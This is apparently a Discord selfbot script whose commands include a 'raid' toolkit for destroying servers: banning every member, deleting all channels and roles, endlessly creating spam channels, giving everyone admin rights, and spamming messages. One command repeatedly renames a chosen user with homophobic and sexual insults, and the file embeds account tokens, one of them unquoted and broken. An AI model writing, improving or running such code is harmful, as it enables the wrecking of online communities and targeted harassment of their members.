import asyncio
import time
import logging
import aiohttp
import colorama
import random
import os
import requests
from colorama import Fore, Style, init
import discord
from discord.utils import get
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import Bot
import datetime
from discord.ext.commands import *
import sys
import threading
from threading import Thread

print(f'{Fore.BLUE}connecting...{Fore.RESET}')

os.system("cls")

sys.stdout.write("\x1b]2;APATHY SELFBOT\x07")
print(f'''{Fore.RED}
                                                        ┌┼┐  ╦  ╔╗╔
                                                        └┼┐  ║  ║║║
                                                        └┼┘  ╩  ╝╚╝
                                             ══════════════════════════════════                            
{Fore.RESET}''')


token2 = input(f'''{Fore.RED}                               token: {Fore.RESET}''')


os.system("cls")

token = token2

client = commands.Bot(command_prefix="$", self_bot=True)
client.remove_command(name="help")

@client.event
async def on_connect():

    print(f'''{Fore.RED}
                                                        ┌┼┐  ╦  ╔╗╔
                                                        └┼┐  ║  ║║║
                                                        └┼┘  ╩  ╝╚╝
                                             ══════════════════════════════════                            
{Fore.RESET}''')

    
    print(f'''{Fore.RED}                                               Logged in as: {client.user}

                                               Your bot prefix is = $
                                               To get commands type: "$help"

                                               any problems? dm apy ¿#1337
                                               made by apy ¿#1337
                                             
                                             ══════════════════════════════════
''')

@client.command()
async def ping(ctx):
    await ctx.send(f"Pong! :ping_pong: Your ping is {round(client.latency * 1000)}ms")

@client.command()
async def statusP(ctx, msg):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Game(name=(f"{msg}")))


@client.command()
async def statusL(ctx, msg):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening), name=(f"{msg}")))



@client.command()
async def statusW(ctx, msg):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching), name=(f"{msg}")))



@client.command()
async def statusS(ctx, msg):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Streaming(name=(f"{msg}"), url='https://www.twitch.tv/apathyrunsyou'))


@client.command()
async def status(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    embed = discord.Embed(colour=discord.Colour.red())
    embed.set_author(name="𝗦𝗧𝗔𝗧𝗨𝗦")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_image(url="https://cdn.discordapp.com/emojis/785512959493406764.gif?v=1")
    embed.add_field(name='𝙨𝙩𝙖𝙩𝙪𝙨𝙋', value="𝘊𝘩𝘢𝘯𝘨𝘦𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰: 𝘗𝘭𝘢𝘺𝘪𝘯𝘨 (𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦)", inline = False)
    embed.add_field(name='𝙨𝙩𝙖𝙩𝙪𝙨𝙇', value="𝘊𝘩𝘢𝘯𝘨𝘦𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰: 𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨 (𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦)", inline = False)
    embed.add_field(name='𝙨𝙩𝙖𝙩𝙪𝙨𝙒', value="𝘊𝘩𝘢𝘯𝘨𝘦𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰: 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨 (𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦)", inline = False)
    embed.add_field(name='𝙨𝙩𝙖𝙩𝙪𝙨𝙎', value="𝘊𝘩𝘢𝘯𝘨𝘦𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰: 𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨 (𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦)", inline = False)
    embed.set_footer(text="$IN coded by xyz ¿#1337")
    await ctx.send(embed=embed)

@client.command()
async def spam(ctx, msg, amount=100):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.send(f"{msg}")

@client.command()
async def say(ctx, msg):
    await ctx.message.delete()
    embed=discord.Embed(title=f"{msg}",colour=discord.Colour.red())
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    embed = discord.Embed(colour=discord.Colour.red())
    embed.set_author(name=f"{member}❜𝘀 𝘀𝗲𝗹𝗳𝗯𝗼𝘁")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_image(url="https://cdn.discordapp.com/emojis/775427519800672316.gif?v=1")
    embed.add_field(name='𝙝𝙚𝙡𝙥', value='𝘨𝘦𝘵 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴', inline = False)
    embed.add_field(name='𝙛𝙪𝙣', value='𝘨𝘦𝘵 𝘧𝘶𝘯 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴𝘴', inline = False)
    embed.add_field(name='𝙨𝙩𝙖𝙩𝙪𝙨', value='𝘨𝘦𝘵 𝘴𝘵𝘢𝘵𝘶𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴', inline = False)
    embed.add_field(name='𝙧𝙖𝙞𝙙', value='𝘨𝘦𝘵 𝘳𝘢𝘪𝘥 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴', inline = False)
    embed.set_footer(text="$IN coded by apy ¿#1337")
    await ctx.send(embed=embed)

@client.command()
async def fun(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    embed = discord.Embed(colour=discord.Colour.red())
    embed.set_author(name="𝗙𝗨𝗡")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_image(url="https://cdn.discordapp.com/emojis/785273460304773160.gif?v=1")
    embed.add_field(name='𝙜𝙖𝙮𝙧𝙖𝙩𝙚', value='𝘨𝘢𝘺𝘳𝘢𝘵𝘦 𝘴𝘰𝘮𝘦𝘰𝘯𝘦', inline = False)
    embed.add_field(name='𝙨𝙞𝙢𝙥𝙧𝙖𝙩𝙚', value='𝘴𝘪𝘮𝘱𝘳𝘢𝘵𝘦 𝘴𝘰𝘮𝘦𝘰𝘯𝘦', inline = False)
    embed.add_field(name='𝙗𝙖𝙡𝙡', value='𝘧𝘰𝘳 8𝘣𝘢𝘭𝘭', inline = False)
    embed.add_field(name='𝙨𝙖𝙮', value='𝘵𝘰 𝘴𝘦𝘯𝘥 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘪𝘯 𝘦𝘮𝘣𝘦𝘥', inline = False)
    embed.add_field(name='𝙛𝙖𝙜𝙜𝙤𝙩', value='𝘵𝘰 𝘨𝘢𝘺 𝘴𝘰𝘮𝘦𝘰𝘯𝘦', inline = False)
    embed.set_footer(text="$IN coded by apy ¿#1337")
    await ctx.send(embed=embed)

@client.command()
async def raid(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    embed = discord.Embed(colour=discord.Colour.red())
    embed.set_author(name="𝗥𝗔𝗜𝗗")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_image(url="https://cdn.discordapp.com/emojis/785900348199665684.gif?v=1")
    embed.add_field(name='𝙨𝙥𝙖𝙢', value='𝘵𝘰 𝘴𝘱𝘢𝘮 "𝘮𝘦𝘴𝘴𝘢𝘨𝘦"', inline = False)
    embed.add_field(name='𝙗𝙖𝙣', value='𝘵𝘰 𝘣𝘢𝘯 𝘦𝘷𝘦𝘳𝘺𝘰𝘯𝘦', inline = False)
    embed.add_field(name='𝙣𝙪𝙠𝙚', value='𝘵𝘰 𝘯𝘶𝘬𝘦 𝘴𝘦𝘳𝘷𝘦𝘳', inline = False)
    embed.add_field(name='𝙧𝙤𝙡𝙚𝙨', value='𝘵𝘰 𝘴𝘱𝘢𝘮 𝘳𝘰𝘭𝘦𝘴', inline = False)
    embed.add_field(name='𝙖𝙙𝙢𝙞𝙣', value='𝘨𝘪𝘷𝘦 𝘦𝘷𝘦𝘳𝘺𝘰𝘯𝘦 𝘢𝘥𝘮𝘪𝘯', inline = False)
    embed.set_footer(text="$IN coded by apy ¿#1337")
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def faggot(ctx, member: discord.Member):
    await ctx.message.delete()
    lolll = ["I love dick  ", "Im gay  ","I love anal  ", "gay rape me", "put ur dick in my ass"]
    for i in range(50):
        await member.edit(nick=random.choice(lolll))
        time.sleep(.5)

@client.command()
async def gayrate(ctx, member: discord.Member):
  x = random.randint(1,100)
  embed=discord.Embed(title=f"Gayrate",description=f'{member.mention} is {x}% gay.', colour = discord.Colour.red())
  await ctx.send(embed=embed)

@client.command()
async def simprate(ctx, member: discord.Member):
  x = random.randint(1,100)
  embed=discord.Embed(title=f"Gayrate",description=f'{member.mention} is {x}% simp.', colour = discord.Colour.red())
  await ctx.send(embed=embed)


@client.command()
async def av(ctx, *, member: discord.Member=None): 
    if not member: 
        member = ctx.message.author
    userAvatar = member.avatar_url
    embed=discord.Embed(title=f'{member.name}s avatar:', colour = discord.Colour.red())
    embed.set_image(url=(member.avatar_url))
    await ctx.send(embed=embed)


@client.command()
async def ball(ctx, *, question):
  member = ctx.message.author
  responses = ['It is certain',
               'Without a doubt',
               'of course lol',
               'Most likely',
               'Yes',
               'Ask again later lol'
               "Don't count on it",
               'My source says no',
               'Outlook not so good',
               'Very doubtful']
  embed=discord.Embed(title=f"{member}",description=f'Question: {question}\nAnswer: {random.choice(responses)}', colour = discord.Colour.red())
  await ctx.send(embed=embed)

@client.command()
async def ban(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.ban(reason=f"wizzed by {client.user}")
      print(f"{Fore.GREEN}wizzed {member.name} ")
    except:
        print(f"{Fore.RED}cant wizzed {member.name} ")
        pass




@client.command()
async def nuke(ctx):
    guild = ctx.message.guild  
    await ctx.message.delete()

    print(f"{Fore.GREEN}Now nuking server!")

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(channel.name + f"{Fore.GREEN} Has Been Deleted")
        except:
            pass


    print("")

    for i in range(1):
        try:
            await ctx.guild.edit(name=f"wizzed by {client.user}")
            print(f'{Fore.GREEN}Discord server name was successfully changed!')

        except Exception as error:
            print(f'{Fore.RED}Server name was failed to change.')

    
    guild = ctx.guild

    print("")
    
    print(f"{Fore.GREEN}successfully Nuked {guild.name}")
    
    for i in range(1):
        await guild.create_text_channel(f"{client.user} ran you")
    while True: 
        for channel in guild.text_channels: 
            for i in range(500):
                await guild.create_text_channel(f"{client.user} ran you")

@client.command()
async def admin(ctx):
  await ctx.message.delete()

  for role in list(ctx.guild.roles):
    
    if role.name == '@everyone':

      try:

        await role.edit(permissions=Permissions.all())
        print(f"{Fore.GREEN}@everyone has admin") 
      except:

        print(f"{Fore.RED}@everyone does NOT have admin")

@client.command()
async def roles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{Fore.GREEN}{role.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{Fore.RED}{role.name} has NOT been deleted in {ctx.guild.name}")

        else:
            for i in range(200):
                try:
                    guild = ctx.guild
                    await guild.create_role(name=f"{client.user} runs you")
                    print(f"{Fore.GREEN}{role.name} has been created in {ctx.guild.name}")
                except Exception as error:
                    try:
                        print(f"{Fore.RED}{role.name} has been failed to create in {ctx.guild.name}")
                    finally:
                        error = None
                        del error

def savage(guild, member):
    headers = {
      'Authorization': Nzc4NDYzMDg4NzU5NTM3NjY1.YLwpog.aax6Dq-JIwea7P6jnYUXKOWfqIE,

    }
    json = {'reason': 'sin nuker'}
    r = requests.put('https://discord.com/api/v8/guilds/%7Bguild%7D/bans/%7Bmember%7D', headers=headers,json=json)
    if r.status_code==204:
      print(f'{member} banned')
    else:
      print(f'{member} not banned')

@client.command()
async def s(ctx):
  total = ctx.guild.member_count
  members_per_arrary = round(total/3)
  members_1= []
  members_2= []
  members_3= []
  for member in ctx.guild.members:
    if len(members_1) != members_per_arrary:
      members_1.append(member.id)
    elif len(members_2) != members_per_arrary:
      members_2.append(member.id) 

    elif len(members_3) != members_per_arrary:
      members_3.append(member.id)
  print(f"Members Scraped {members_1}\n{members_2}\n{members_3}")
  num = 0
  num1 = 0
  num2 = 0
  while True:
    try:
      if threading.active_count() <= 500:
        Thread(target=savage, args=(ctx.guild.id, members_1[num])).start()
        num += 1
        Thread(target=savage, args=(ctx.guild.id, members_2[num1])).start()
        num1+= 1
        Thread(target=savage, args=(ctx.guild.id, members_3[num2])).start()
        num2 += 1
    except IndexError as si:
      break
    except Exception as se:
      pass

client.run("Mjc3NTE0MzEyNjE5MjYxOTYz.YRw9bQ.IM4DOZr0TBqYNbOcQ6eAcq86XXg", bot=False)
